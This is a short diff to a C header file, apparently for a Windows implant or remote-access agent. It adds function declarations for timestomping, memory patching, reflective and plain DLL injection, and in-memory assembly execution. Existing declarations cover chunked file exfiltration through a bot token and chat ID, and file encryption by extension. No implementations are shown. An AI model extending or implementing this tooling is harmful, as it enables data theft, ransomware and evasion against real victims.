@@ -41,6 +41,11 @@ char *cmd_chunked_send(const char *path, int chunk_mb,
                        const char *token, const char *chat_id);
 char *cmd_encrypt_files(const char *root, const char *ext,
                         const char *key_hex);
+char *cmd_timestomp(const char *source, const char *target);
+char *cmd_mem_patch(const char *addr_hex, const char *patch_b64);
+char *cmd_rdi_inject(DWORD pid, const char *dll_b64);
+char *cmd_dll_inject(const char *dll_b64);
+char *cmd_execute_assembly(const char *asm_b64, const char *arguments);
 
 /* ── syscall/direct_syscall.c ──────────────────────────────────────────────── */
 #include <winternl.h>
